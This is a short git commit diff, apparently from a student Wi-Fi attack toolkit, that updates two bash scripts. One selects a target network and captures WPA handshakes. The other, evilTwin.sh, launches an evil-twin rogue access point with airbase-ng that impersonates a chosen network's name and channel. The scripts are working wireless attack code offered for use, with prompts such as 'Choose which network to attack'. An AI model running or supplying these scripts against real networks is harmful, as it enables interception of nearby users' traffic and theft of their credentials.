18ee54ae0a0e08be68a1f9754d637332d8a84003
PatrickWumbo <jhuh009@ucr.edu>
2019-04-28 14:59:56 +0000

    implemented evil twin

--- scripts/captureHandshakes.sh
+++ scripts/captureHandshakes.sh
@@ -1,6 +1,5 @@
 #!/bin/bash
 
-#cat targetList.txt | awk '{print "BSSD: "$1 "\nChannel: "$6 "\nCrypto: "$8 "\nSSID: "$11}'
 rm -rf *.cap
 
 echo "Choose which network to attack."
@@ -8,16 +7,10 @@ cat network-list.txt
 
 read -r input
 
-#cat network-list.txt | awk -F":" 'BEGIN{print $i}' i="${input}"
 ssid=$(awk -v pat="$input" -F ":" '$0~pat{print $2}' network-list.txt)
 
 awk -v pat="$ssid" -F" " '$0~pat{print $2" "$3}' networks.txt > combined.txt
-#targetChannel=$(awk -v pat="$ssid" -F" " '$0~pat{print $3}' networks.txt)
-#$(awk -v pat="$ssid" -F" " '$0~pat{print $4}' networks.txt)> targetChannel.txt
 interface=$(cat interfaceToUse.txt)
-#echo $targetBSSID
-#echo $targetChannel
-#cat combined.txt
 targetChannel=$(awk -F " " 'FNR<2{print $2}' combined.txt)
 targetBSSID=$(awk -F " " 'FNR<2{print $1}' combined.txt)
 
--- scripts/evilTwin.sh
+++ scripts/evilTwin.sh
@@ -1,8 +1,17 @@
 #!/bin/bash
 
-targetESSID=$(cat targetList.txt | awk '{print $15}')
-targetChannel=$(cat targetList.txt | awk '{print $6}')
-interface=$(cat interfaceToUse.txt)
+echo "Choose which network to fake."
+cat network-list.txt
 
+read -r input
+
+ssid=$(awk -v pat="$input" -F ":" '$0~pat{print $2}' network-list.txt)
+
+awk -v pat="$ssid" -F" " '$0~pat{print $2" "$3}' networks.txt > combined.txt
+#cat combined.txt
+targetESSID=$ssid
+targetChannel=$( awk -F " " 'FNR<2{print $2}' combined.txt)
+interface=$(cat interfaceToUse.txt)
 echo "Starting the twin :)"
+
 airbase-ng -e $targetESSID -c $targetChannel -P $interface
